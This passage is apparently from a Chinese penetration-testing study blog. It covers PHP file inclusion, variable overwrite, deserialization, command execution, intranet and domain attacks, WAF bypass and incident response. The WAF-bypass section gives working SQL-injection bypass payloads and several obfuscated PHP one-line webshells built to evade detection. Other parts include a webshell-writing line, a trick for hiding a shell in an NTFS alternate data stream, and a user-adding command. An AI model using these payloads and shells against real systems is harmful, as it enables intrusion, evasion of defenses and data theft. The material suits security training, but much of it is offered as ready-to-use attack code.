class=\"language-none\">假如你进入了后台，那么后台中的没一个页面应该都会验证你的权限，但是每个PHP文件中都写验证的那段代码就会佷冗余，于是开发定义了一个文件包含函数，可以引用那个用于验证的代码写的文件。\n那么这个文件里的内容一定会被当做PHP执行，不管任何后缀。</code></pre>\n\n<p>file_put_contents()：创建文件</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;?php file_put_contents(&#39;1.php&#39;,&#39;&lt;?php eval($_REQUEST[8])?&gt;&#39;);?&gt;</code></pre>\n\n<p><strong>文件包含本身只是一个功能，但是当你能够任意控制包含的文件时，文件包含就有漏洞了。</strong></p>\n<h2 id=\"函数解析：\"><a href=\"#函数解析：\" class=\"headerlink\" title=\"函数解析：\"></a>函数解析：</h2><pre class=\"line-numbers language-none\"><code class=\"language-none\">include：用到临时加载（临时加载然后使用）[不影响整体]。使用include引用外部文件时，只有代码执行到include代码段时，调用的外部文件才会被引用并读取，当引用的文件发生错误时，系统只会给出个警告错误，而整个php文件会继续执行。\n\nrequire：先加载，然后整合原有代码，然后一起执行[影响整体]。在php我呢间被执行之前，php解析器会用被引用的我呢间爱你的全部内容奇幻require语句，然后与require语句之外的其他语句组成个新的php文件，最后按新的php文件执行代码程序。\n\ninclude_once：使用include_once会在导入文件前先检测该文件是否在该页面的其他部分被应用过，如果有，则不会重复引用该文件，程序只能引用一次。（要导入的文件中存在一些自定义函数，那么如果在同一个程序中重复导入这个文件，在第二次导入时便会发生错误，因为php不允许相同名称的函数被重复声明）。\n\nrequire_once：require_once语句的延伸，它的功能与require语句基本一致，不同的是，在应用require_once时，先会检查要引用的文件是不是已经在该程序中的其他地方被引用过，如果有，则不会再重复调用该文件。（同时使用require_once语句在同一页面中引用了两个不同的文件，那么在输出时，只有第一个文件被执行，第二个引用的文件则不会被执行）。</code></pre>\n\n<p>PHP默认不能包含远程文件，需要开启allow_url_include = On</p>\n<p>虽然远程文件包含需要改配置，但是在windows中可以通过SMB服务使本地文件包含变成远程包含。</p>\n<p>cmd的小技巧：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">cd xxxxx&#x2F;..&#x2F;admin\n先进入xxxxx文件，再..&#x2F;跳出文件夹，然后再跳入admin，写一个不存在的路径，然后跳出来，再去访问其他。\n\n在php里面？代表传参，所以会报错。文件包含的内容里面是不能出现？</code></pre>\n\n<h1 id=\"十三、变量覆盖漏洞\"><a href=\"#十三、变量覆盖漏洞\" class=\"headerlink\" title=\"十三、变量覆盖漏洞\"></a>十三、变量覆盖漏洞</h1><h2 id=\"什么是变量覆盖：\"><a href=\"#什么是变量覆盖：\" class=\"headerlink\" title=\"什么是变量覆盖：\"></a>什么是变量覆盖：</h2><p>变量覆盖指的是可以用我们的传参值替换程序原有的变量值，自身危害由代码本身来决定。</p>\n<h2 id=\"如何寻找变量覆盖：\"><a href=\"#如何寻找变量覆盖：\" class=\"headerlink\" title=\"如何寻找变量覆盖：\"></a>如何寻找变量覆盖：</h2><p>经常导致变量覆盖漏洞场景有：$$使用不当，extract()函数使用不当，parse_str()函数使用不当，import_request_variables()使用不当，开启了全局变量注册等。</p>\n<h2 id=\"引发变量覆盖漏洞的函数：\"><a href=\"#引发变量覆盖漏洞的函数：\" class=\"headerlink\" title=\"引发变量覆盖漏洞的函数：\"></a>引发变量覆盖漏洞的函数：</h2><p>extract()：</p>\n<p>作用：将数组变成变量。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;?php\n$a &#x3D; &quot;1&quot;;\n$my_array &#x3D; array(&quot;a&quot; &#x3D;&gt; &quot;Cat&quot;,&quot;b&quot; &#x3D;&gt; &quot;Dog&quot;, &quot;c&quot; &#x3D;&gt; &quot;Horse&quot;);\nextract($my_array);\necho &quot;\\$a &#x3D; $a; \\$b &#x3D; $b; \\$c &#x3D; $c&quot;;\n?&gt;\n \n运行结果：$a &#x3D; Cat; $b &#x3D; Dog; $c &#x3D; Horse</code></pre>\n\n<p>parse_str()：将查询字符串解析到变量中，即把字符串变成变量</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;?php\n\tparse_str(&quot;name&#x3D;gyy&amp;&amp;age&#x3D;60&quot;);   \n\techo $name.&quot;&lt;br&gt;&quot;;\n\techo $age;\n\t?&gt;\n\n输出了gyy和60 </code></pre>\n\n<p>import_request_variables()</p>\n<p>PHP中：=：赋值；==：比较（值）；===：即比较值又比较类型</p>\n<p>trim()：去掉变量头部和尾部的空格；</p>\n<p>isset()：检查变量是否存在。</p>\n<p><strong>变量覆盖漏洞=&gt;特定属于白盒代码审计的。</strong></p>\n<p>白盒与黑盒的区别就是：是否有源代码。</p>\n<h2 id=\"函数解析\"><a href=\"#函数解析\" class=\"headerlink\" title=\"函数解析\"></a>函数解析</h2><p>不仅仅是函数会导致变量覆盖，有些特殊符号的特殊搭配也会引起变量覆盖漏洞，比如$$</p>\n<p>$$导致的变量覆盖问题在CTF代码审计题目中经常在foreach中出现。如以下示例代码，使用foreach来遍历数组中的值，然后再将获取到的数组键名作为变量，数组中的值作为变量的值。因此就产生了变量覆盖漏洞。请求?name=test会将$name的值覆盖，变成test。</p>\n<p>例题：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;?php\n$a &#x3D; 1;\nforeach(array(&#39;_COOKIE&#39;,&#39;POST&#39;,&#39;GET&#39;)as $_request)&#123;\nforeach($$_request as $key &#x3D;&gt; $value)\n&#123;$$_key &#x3D; addslashes($value);&#125;\n&#125;\necho $a;\n?&gt;\n\naddslashes()：魔术引号的函数，在每个双引号前加一个反斜杠。\n\n这个代码会接受我们的GET提交、POST提交、COOKIE参数，将这个接受来的参数一次放入$_request\n\t$key&#x3D;&gt;$_value这是个数组解析，实际上就是键值分离。\n正常而言$a &#x3D; 1是一个定值，但是因为$$_key的缘故，当我传参a&#x3D;2；那么$$_key&#x3D;addslashes($_value);\n就变成了$a&#x3D;2。\n</code></pre>\n\n\n\n<p>每一个cookie都会在服务器上对应一个session；</p>\n<p>cookie只是字符串，本身没有什么意义，只是网站随机分配；</p>\n<p>session决定你是否有权限，存在服务器上的，一般在一个php文件内。</p>\n<h1 id=\"十四、unserialize反序列化漏洞\"><a href=\"#十四、unserialize反序列化漏洞\" class=\"headerlink\" title=\"十四、unserialize反序列化漏洞\"></a>十四、unserialize反序列化漏洞</h1><h2 id=\"什么是序列化和反序列化\"><a href=\"#什么是序列化和反序列化\" class=\"headerlink\" title=\"什么是序列化和反序列化\"></a>什么是序列化和反序列化</h2><p>序列化：当在php中创建了一个对象后，可以通过serialize()把这个对象转变成 一个字符串，保存对象的值方便之后的传递与使用。</p>\n<p>反序列化：就是将字符串转变为对象供程序使用。</p>\n<p>序列化=&gt;存档[保存当前的状态]    serialize()</p>\n<p>反序列化=&gt;读档[还原序列化时的状态]    unserialize()</p>\n<h2 id=\"什么是反序列化漏洞\"><a href=\"#什么是反序列化漏洞\" class=\"headerlink\" title=\"什么是反序列化漏洞\"></a>什么是反序列化漏洞</h2><p>当程序在进行反序列化时，会自动调用一些函数，例如__wakeup()等函数，当传给unserialize()的参数可控时，那么用户可以注入精心构造的一些恶意代码payload，从而导致反序列化漏洞。当进行反序列化的时候就有可能会触发对象中的一些魔术方法，造成意想不到的危害。</p>\n<h2 id=\"PHP魔术方法\"><a href=\"#PHP魔术方法\" class=\"headerlink\" title=\"PHP魔术方法\"></a>PHP魔术方法</h2><p>魔术方法是PHP面向对象中特有的特性。它们在特定的情况下可以做到自动触发，都是以双下划线开头，利用魔术方法可以轻松实现PHP面向对象中重载（Overloading即动态创建类属性和方法）。问题就出现在重载过程中，执行了相关代码。</p>\n<h2 id=\"魔术方法\"><a href=\"#魔术方法\" class=\"headerlink\" title=\"魔术方法\"></a>魔术方法</h2><p>自动触发的函数，满足条件就触发，总共有11个。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">__get($property)：当调用一个未定义的属相时访问此方法；\n__set($property,$value)：给一个未定义的属性赋值时调用。\n\n__isset($property)：当在一个未定义的属性上掉员工isset()函数时调用此方法；\n__unset($property)：当在一个未定义的属性上调用unset()函数时调用此方法。\n\n__call($method,$arg_array)：当调用一个未定义（包括没有权限访问）的方法是调用此方法\n\n__autoload()：使用尚未被定义的类时自动调用。通过此函数，脚本引擎在PHP出错失败前有了最后一次机会加载所需的类。注意：在__autoload函数中跑出的异常不能被catch语句块捕获并导致致命错误。\n\n__construct()：对象创建的时候会自动调用；\n__destruct()：对象销毁的时候会自动调用。\n\n_clone()：PHP5中的对象赋值是使用的引用赋值，使用clone方法赋值一个对象时，对象会自动调用__clone魔术方法，如果在对象赋值需要执行某些初始化操作，可以在__clone方法实现。\n\n__toString()：在将一个对象转化成字符串时自动调用，比如使用echo打印对象时，如果类没有实现此方法，则无法通过echo打印对象，否则会显示：Catchable fatal error: Object of class test could not be converted to string in，此方法必须返回一个字符串。\n\n__sleep()：序列化的时候用；\n__wakeup()：在使用unserialize()函数时会被调用。\n\n__set_state()：当调用var_export()时，这个静态方法会被调用（自PHP5.1.0起有效）。本方法的唯一参数是一个数组。\n\n__invoke()：当尝试以调用函数的方式调用一个对象时，__invoke方法会被自动调用。PHP5.3.0以上版本有效。\n\n__callStatic()：他的工作方式类似于_call()魔术方法，_callStatic()是为了处理静态方法调用，PHP5.3.0以上版本有效，PHP确实加强了对__callStatic（方法的定义；它必须是公开的，并且必须被声明为静态的。\n同样，__call() 魔术方法必须被定义为公共的，所有其他魔术方法都必须如此。</code></pre>\n\n<p><strong>对象被调用后就被销毁</strong></p>\n<h2 id=\"总结：\"><a href=\"#总结：\" class=\"headerlink\" title=\"总结：\"></a>总结：</h2><p>反序列化漏洞：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">危害在于魔术方法里面写了什么；\n找到一个可以操作的变量$this-&gt;xxxx;\n找到一个反序列化的地方（会执行序列化的点）\n我们要传参控制那个变量并触发魔术方法。\n\na存在反序列化，且你能控制内容。a被很多文件包含了，那么这个时候，那些包含了a文件的代码里面如果有类，你都可以调用。\n构造利用链：你的参数-&gt;反序列化函数</code></pre>\n\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">__FILE__：当前的绝对路径\n&lt;? &#x3D;$todo ?&gt;   &lt;&#x3D;&gt;\t&lt;?php echo $todo ?&gt;</code></pre>\n\n<p>开发不傻，正常而言不可能给你各种传参影响，所以在项目中用的是<strong>phar协议来自动触发反序列化</strong>==&gt;读取文件的地方都能用。</p>\n<h2 id=\"防御反序列化漏洞\"><a href=\"#防御反序列化漏洞\" class=\"headerlink\" title=\"防御反序列化漏洞\"></a>防御反序列化漏洞</h2><ol>\n<li>不要把用户的输入或者是用户可控的参数直接放进方序列化的操作中去。</li>\n<li>在进入反序列化函数之前，对参数进行限制过滤。</li>\n<li>鉴定权限，反序列化结构进行鉴定权限，仅允许后台管理等特许人员才能调用。</li>\n<li>白名单，限制反序列化的类。</li>\n<li>RASP（Runtime application self-protection，运行时应用自我保护）检测。</li>\n</ol>\n<h1 id=\"十五、命令执行漏洞\"><a href=\"#十五、命令执行漏洞\" class=\"headerlink\" title=\"十五、命令执行漏洞\"></a>十五、命令执行漏洞</h1><p><strong>原理：用户输入的数据被当做系统命令执行</strong></p>\n<h2 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h2><p>命令执行漏洞是指攻击者可以随意执行系统命令。属于代码执行的范畴。命令执行漏洞不仅仅存在于B/S架构中，在C/S架构中也常遇到。</p>\n<p>简单来说，用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令，可能会允许使用者通过改变$PATH或者程序执行环境的其他方面来执行一个恶意构造的代码。</p>\n<h2 id=\"漏洞产生原因\"><a href=\"#漏洞产生原因\" class=\"headerlink\" title=\"漏洞产生原因\"></a>漏洞产生原因</h2><p>没有对用户输入的进行过滤或过滤不严，例如：没有过滤&amp;、&amp;&amp;、|、||等连接符号。</p>\n<p>系统漏洞造成的命令执行：bash破壳漏洞(CVE-2014-6271)，该漏洞可以构造环境变量的值来执行具有攻击力的脚本代码，会影响到bash交互的多种应用，如http、ssh和dhcp等。</p>\n<p>调用的第三方组件存在代码漏洞，例如：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">php（system()、shell_exec()、exec()、eval())\nJAVA中的命令执行漏洞（structs2&#x2F;ELasticsearchGroovy等）\nThinkPHP命令执行</code></pre>\n\n<h2 id=\"PHP下命令执行函数\"><a href=\"#PHP下命令执行函数\" class=\"headerlink\" title=\"PHP下命令执行函数\"></a>PHP下命令执行函数</h2><ol>\n<li><p>system()</p>\n<p>执行命令输出结果</p>\n</li>\n<li><p>echo exec(‘whoami’)</p>\n<p>PHP会去操纵计算机执行whoami的命令，且获取最后一行数据</p>\n</li>\n<li><p>echo shell_exec(‘whoami’)</p>\n<p>PHP会去操纵计算机执行whoami的命令，且获取所有数据。</p>\n</li>\n<li><p>passthru(‘whoami’)</p>\n<p>只调用命令，把命令的运行结果原样的直接输出到标准输出设备。</p>\n</li>\n<li><p>特殊符号，反引号（`）=&gt; echo ‘whoami’</p>\n<p>反引号其实就是调用的shell_exec()函数。shell_exec(被禁用了的话，反引号也不能用，但只是被过滤就不一样。</p>\n</li>\n<li><p>$a = popen(‘whoami’,’r’); echo fread($a,1024);</p>\n</li>\n</ol>\n<p>cmd简单命令：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">netstat -ano \t查看端口\ntasklist\t查看进程\nipconfig\t查看ip\nkill\t\t杀死进程的\narp -a\t\t探测路由表\nwhoami\t\t查看当前权限\nshutdown\t关机（关闭杀软服务，然后重启主机）\nsysteminfo\t查看系统状态\nnet user\t查看用户\nnet user a abc123 &#x2F;add\t添加用户</code></pre>\n\n<h1 id=\"十六、内网渗透\"><a href=\"#十六、内网渗透\" class=\"headerlink\" title=\"十六、内网渗透\"></a>十六、内网渗透</h1><h2 id=\"内网渗透\"><a href=\"#内网渗透\" class=\"headerlink\" title=\"内网渗透\"></a>内网渗透</h2><ol>\n<li><p>SQL注入写入webshell</p>\n</li>\n<li><p>提权</p>\n<ol>\n<li>利用目标主机上的服务提权（目标主机运行着xxx软件，但是这个软件有漏洞可以利用）</li>\n<li>利用web服务（一台机器上有可能有多个网站，多个web容器），比如A站是低权限运行的，B站是高权限运行的，然后通过webshell拿下A站之后再往B站写马，进而拿到高权限。</li>\n<li>利用windows漏洞|Linux漏洞，systeminfo可以查看打过哪些补丁，然后去网上找存在什么样的漏洞，然后找对应的提权工具。</li>\n</ol>\n</li>\n<li><p>正向连接——内网穿透</p>\n<p>利用reGeorg：可以将我们传输的数据给目标站点，然后打开并配置Proxifier，之后直接可以用mstsc远程连接。</p>\n<p>然后横向渗透，探测内网</p>\n<ol>\n<li>arp -a</li>\n<li>可以上3389装nmap，扫描内网ip</li>\n</ol>\n</li>\n<li><p>猕猴桃抓取管理员密码</p>\n<p>一个服务器管理员管理多台及其，管理员密码可能都相同，用猕猴桃可以抓取到。</p>\n</li>\n</ol>\n<h2 id=\"域渗透\"><a href=\"#域渗透\" class=\"headerlink\" title=\"域渗透\"></a>域渗透</h2><p>域控的账号密码可以登录任意的域中的电脑。</p>\n<p>Windows认证协议——Kerberos</p>\n<p>黄金票据（后门），还有白银票据：</p>\n<p>一个是用的域控用户账号，一个用的是krbtgt账户</p>\n<p>制作黄金票据需要用到猕猴桃工具（法国神器）。</p>\n<h1 id=\"十七、APP渗透\"><a href=\"#十七、APP渗透\" class=\"headerlink\" title=\"十七、APP渗透\"></a>十七、APP渗透</h1><p><strong>APP渗透和Web渗透基本没有区别</strong></p>\n<h1 id=\"十八、绕过WAF\"><a href=\"#十八、绕过WAF\" class=\"headerlink\" title=\"十八、绕过WAF\"></a>十八、绕过WAF</h1><h2 id=\"sql绕过\"><a href=\"#sql绕过\" class=\"headerlink\" title=\"sql绕过\"></a>sql绕过</h2><p>WAF的检测核心就是<strong>正则表达式</strong>，虽然还有字符串强行匹配，还有什么语义解析，但是实际上还是正则居多。这里主要讲针对SQL注入。</p>\n<p>当我们遇到WAF拦截是正则匹配，第一反应就是：替换函数。</p>\n<p>例如：id=1 and 1=1</p>\n<p>WAF对and进行了拦截，那我们可以尝试一下运算符，如：&amp;。</p>\n<p>如果发现只输入and不拦，那么就要想办法改一改1=1，可以试试-1=-1.</p>\n<p>甚至例如直接传参，我使用加减符号，乘除符号运算，或者是字符串传参直接用16进制也可以绕过。</p>\n<p>这里要说一个叫做<strong>内联注释</strong>的东西。</p>\n<p><strong>内联注释</strong>：是MYSQL为了保持与其他数据兼容，将MYSQL中特有的语句放在/!…*/中，这些语句在不兼容的数据库中不执行，而在MYSQL自身确定识别，执行。</p>\n<p>在url栏中特殊符号有自己特殊的含义，&amp;就代表连接传参的，例：id=1 &amp; id=2。</p>\n<p>将&amp;进行url编码再输入就代表数据库中的与运算了。</p>\n<p>也可以使用十六进制0x来试下，例：id=0x31</p>\n<p>可以个order by直接union select，拦截了union select就试一下union all select，还是被拦就用内联注释</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&#x2F;**&#x2F;：在数据库中代表注释\n\n&#x2F;*!*&#x2F;：是内联注释，在内联注释里面的SQL语句会被执行。</code></pre>\n\n<p>当内联注释</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">union &#x2F;*!select*&#x2F;</code></pre>\n\n<p>也被拦截了，可以尝试加入版本号50001，即</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">union &#x2F;*!50001 select*&#x2F;\t\t#代表数据库版本为5.00.01时执行</code></pre>\n\n<p>若还是被拦截下，就是下5000，因为5000版本<strong>不存在</strong>，可能就不拦了，但是执行不了，那么有可能有些版本号被漏掉，使union select既能执行又能绕过的，用burp爆破一下，从10000-99999</p>\n<p>这个绕过后，尝试</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">union &#x2F;*!10044 select*&#x2F; 1,2,3 from admin limit 1,1</code></pre>\n\n<p>很可能被拦，那就一段段的删，判断拦截的是哪里，判断出form admin这里被拦的话，再用内联注释就绕不过去了，可以尝试以下方法：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">常见手法：\n\t大小写绕过（很老的WAF才有用）\n\t替换饶过（很老的WAF才有用）[和上传文件pphphp一样]\n\t特殊字符绕过（%0a换行）\n\t编码绕过（比如会多次解码的东西）\n\t等价替换（利用其他函数替换）[union #%0aselect 拦截][union all #%0aselect不拦截]\n\t容器特性（例如Apache的Hpp，或者是IIS的%分割）\n\t白名单（管理员权限或者是127.0.0.1本地访问不拦截）\n\t缓冲区（数据太多了，超出了WAF检测的范围）填充大量字符来溢出，例如填入大量的注释内容，安全狗大约4千多个字符就能绕过。</code></pre>\n\n<p><strong>用%0a换行绕过的：</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">-- qwe &#x2F;*%0afrom admin %23*&#x2F;\t\t\t%23代表#，在mysql里是注释</code></pre>\n\n<p>因为%0a代表换行，所以这里相当于</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">-- qwe &#x2F;*%0a*&#x2F;\nfrom admin #\t\t\t-- qwe注释掉了&#x2F;*，%23注释掉了*&#x2F;</code></pre>\n\n<p>然后安全狗认为/**/里面的东西是安全的。</p>\n<p>有些特殊字符加了反引号也是可以运行的，例：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&#96;sleep&#96;(5)</code></pre>\n\n<p><strong>容器特性绕过：</strong></p>\n<p>在IIS中</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">s%e%l%e%c%t 与 select 是等价的</code></pre>\n\n<p>Apache中的参数污染</p>\n<p><a href=\"https://blog.csdn.net/u011154053/article/details/120129941?ops_request_misc=%7B%22request_id%22:%22166452372016800192271679%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=166452372016800192271679&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-1-120129941-null-null.142%5Ev51%5Econtrol,201%5Ev3%5Econtrol_2&utm_term=Apache%E7%9A%84Hpp&spm=1018.2226.3001.4187\">(1条消息) 参数污染漏洞（HPP）挖掘技巧及实战案例全汇总_Restart222的博客-CSDN博客_hpp漏洞</a></p>\n<p>例：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">id&#x3D;1\t\t会显示1的内容\n\nid&#x3D;1&amp;id&#x3D;2\t会显示2的内容\n\nid&#x3D;1&#x2F;*&amp;id&#x3D;2%23*&#x2F;\t相当于安全狗认为注释内的安全，然而执行的则是id&#x3D;2\n那么id&#x3D;1 &#x2F;*id&#x3D;2 union select 1,password,3 from admin limit 1,1%23*&#x2F;</code></pre>\n\n<h2 id=\"webshell的绕过\"><a href=\"#webshell的绕过\" class=\"headerlink\" title=\"webshell的绕过\"></a>webshell的绕过</h2><p>例如：最常见的PHP一句话木马</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;?php eval($REQUEST[&#39;a&#39;])?&gt;\n\n我们尝试只写&lt;?php eval();?&gt;发现没有拦截，但是加了$_REQUEST[&#39;a&#39;]就拦截了，那么我们是不是可以尝试测试看看究竟拦截$_REQUEST[&#39;a&#39;]的那个部分。\n\n然后测试发现，他拦截的是$_REQUEST[那么我们只要不出现中括号就可以解决对吗，或者我们尝试把这个变量换一个就可以解决。\n\n例如：&lt;?php eval(end($_REQUEST));?&gt;\n这个语句就没有出现$_REQUEST[所以成功绕过，我们用end代替了[]\nend函数的意义：输出数组中的当前元素和最后一个元素的值，然后因为我的传参寄一个。\n但是唯一不好的就是它没有密码，即传参名，所以用什么当密码都行。</code></pre>\n\n<h3 id=\"常见绕过手法：\"><a href=\"#常见绕过手法：\" class=\"headerlink\" title=\"常见绕过手法：\"></a>常见绕过手法：</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">1、通过常量定义：\n&lt;?php define(&quot;a&quot;,&quot;$_GET[1]&quot;);eval(a);\n\n2、通过字符串拼接+双美元符号：\n&lt;?php \t$a&#x3D;ass;\n\t\t$b&#x3D;&#39;ert&#39;;\n\t\t$funcName&#x3D;$a.$b;\n\t\t$x&#x3D;&#39;funcName&#39;;\n\t\t$$x($_REQUEST[1]);\n\t\t\n3、通过函数定义强行分割：\n&lt;?php \n\tfunction a($a)&#123;\n\treturn $a;&#125;\n\teval(a($_POST)[&#39;a&#39;]);\t\t&#x2F;&#x2F;强行分割$_POST[&#39;a&#39;]\n\n4、通过类定义，然后传参强制分割：\n&lt;?php\n\tclass User\n\t&#123;\n\tpublic $name &#x3D; &#39;&#39;;\n\tfunction __destruct()&#123;\n\teval(&quot;$this-&gt;name&quot;);\n\t&#125;\n\t&#125;\n\t$user&#x3D; new User;\n\t$user-&gt;name &#x3D;&quot;.$POST[&#39;dd&#39;]&quot;;\n?&gt;\n\n5、多方式传参免杀：\n&lt;?php\n\t$COOKIE &#x3D; $_COOKIE;\n\tforeach($COOKIE as $key &#x3D;&gt; $value)&#123;\n\t\tif($key&#x3D;&#x3D;&#39;assert&#39;)&#123;\n\t\t\t$key($_POST[&#39;s&#39;];);\n\t\t&#125;\n\t&#125;\n?&gt;\n\n\n拿到shell之后藏shell的小妙招：ntfs文件流\n\t&lt;?php include(&#39;&#x2F;:123.txt&#39;)?+echo &quot;&lt;?php eval($_REQUEST[&#39;a&#39;])?&gt;&quot; &gt;&gt; &#x2F;:123.txt\n\t此时会生成一个123.txt文件，但是不会显示，再另外创建一个php文件，内容为&lt;?php include(&#39;&#x2F;:123.txt&#39;);?&gt;就可以使用这个shell了\n\t\n\n绕过市面上所有WAF（终极手法）：\n&lt;?php \neval(mysqli_fetch_assoc(mysqli_query(mysqli_connect(&#39;127.0.0.1&#39;,&#39;root&#39;,&#39;root&#39;,&#39;maoshe&#39;),select * from info))[&#39;infor&#39;]);\n\t这里输入的全部都是目标数据库的信息。</code></pre>\n\n<h1 id=\"十九、应急响应\"><a href=\"#十九、应急响应\" class=\"headerlink\" title=\"十九、应急响应\"></a>十九、应急响应</h1><h2 id=\"流程分析：\"><a href=\"#流程分析：\" class=\"headerlink\" title=\"流程分析：\"></a>流程分析：</h2><p>准备阶段：</p>\n<p>准备阶段需要做的是主要是明确资产范围，对可能产生安全问题的地方进行加固。</p>\n<p>检测阶段：</p>\n<p>通过日常的监控，手机系统信息日志等手段对可疑的迹象进行分析、判定，如果判定它属于网络安全应急响应时事件则对该事件进行上报。</p>\n<p>抑制阶段;</p>\n<p>分析影响范围，根据预案采取相应手段，限制攻击的范围，设置隔离区，把影响降低到最小（可以使用安全软件把危险文件进行隔离，如果整台电脑完全沦陷，也可以考虑首先断网）。</p>\n<p>根除阶段：</p>\n<p>分析产生安全事件的原因，如果是木马、病毒就需要寻找病毒的传播源并且遏制、如果是入侵行为就可以通过入侵检测的方式捕获并检测数据流，也可以利用一些工具对病毒特征进行分析和定位。</p>\n<p>恢复阶段：</p>\n<p>对受到破坏的系统和信息还原成正常状态，从可信任的备份中恢复还原系统配置数据库等等，并对其进行监控，确保无误后可适当去掉之前的隔离等抑制措施。</p>\n<p>总结阶段：</p>\n<p>对我们上面所发生的安全事件进行总结，对你使用到有效的手段和方法做一个记录，对后面可能遇到的事件做一个实例。</p>\n","feature":true,"text":"一、信息收集信息收集收集的是什么：whois信息；子域名；端口探测；目录扫描；指纹识别；旁站查询；C段查询；内容敏感信息泄露 使用的工具：谷歌镜像站：使用谷歌语法进行搜索 网络空间搜索引擎：FOFA、钟馗之眼、撒旦。直接搜索网络中的主机或其他网络设备，显示主机的IP、端口、中间件...","link":"","photos":[],"count_time":{"symbolsCount":"46k","symbolsTime":"42 mins."},"categories":[],"tags":[{"name":"渗透测试","slug":"渗透测试","count":1,"path":"api/tags/渗透测试.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E4%B8%80%E3%80%81%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86\"><span class=\"toc-text\">一、信息收集</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%94%B6%E9%9B%86%E7%9A%84%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9A\"><span class=\"toc-text\">信息收集收集的是什么：</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%BD%BF%E7%94%A8%E7%9A%84%E5%B7%A5%E5%85%B7%EF%BC%9A\"><span class=\"toc-text\">使用的工具：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%BB%95%E8%BF%87CDN%EF%BC%9A\"><span class=\"toc-text\">绕过CDN：</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%AB%AF%E5%8F%A3%E7%8A%B6%E6%80%81%EF%BC%9A\"><span class=\"toc-text\">端口状态：</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E4%BA%8C%E3%80%81SQL%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">二、SQL注入</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#1%E3%80%81%E6%8C%89%E6%B3%A8%E5%85%A5%E7%82%B9%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%88%86%E7%B1%BB%EF%BC%9A\"><span class=\"toc-text\">1、按注入点数据类型分类：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1-%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">1.数字型注入</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2-%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">2.字符型注入</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#3-%E6%90%9C%E7%B4%A2%E5%9E%8B%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">3.搜索型注入</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#2%E3%80%81%E6%8C%89%E7%85%A7%E6%95%B0%E6%8D%AE%E6%8F%90%E4%BA%A4%E6%96%B9%E5%BC%8F%E5%88%86%E7%B1%BB\"><span class=\"toc-text\">2、按照数据提交方式分类</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1-get%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">1.get注入</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2-post%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">2.post注入</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#3-head%E5%A4%B4%E6%B3%A8%E5%85%A5%EF%BC%88http%E5%A4%B4%E6%B3%A8%E5%85%A5%EF%BC%89\"><span class=\"toc-text\">3.head头注入（http头注入）</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#3%E3%80%81%E6%8C%89%E7%85%A7%E6%89%A7%E8%A1%8C%E6%95%88%E6%9E%9C%E5%88%86%E7%B1%BB\"><span class=\"toc-text\">3、按照执行效果分类</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1-%E7%9B%B2%E6%B3%A8\"><span class=\"toc-text\">1.盲注</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" 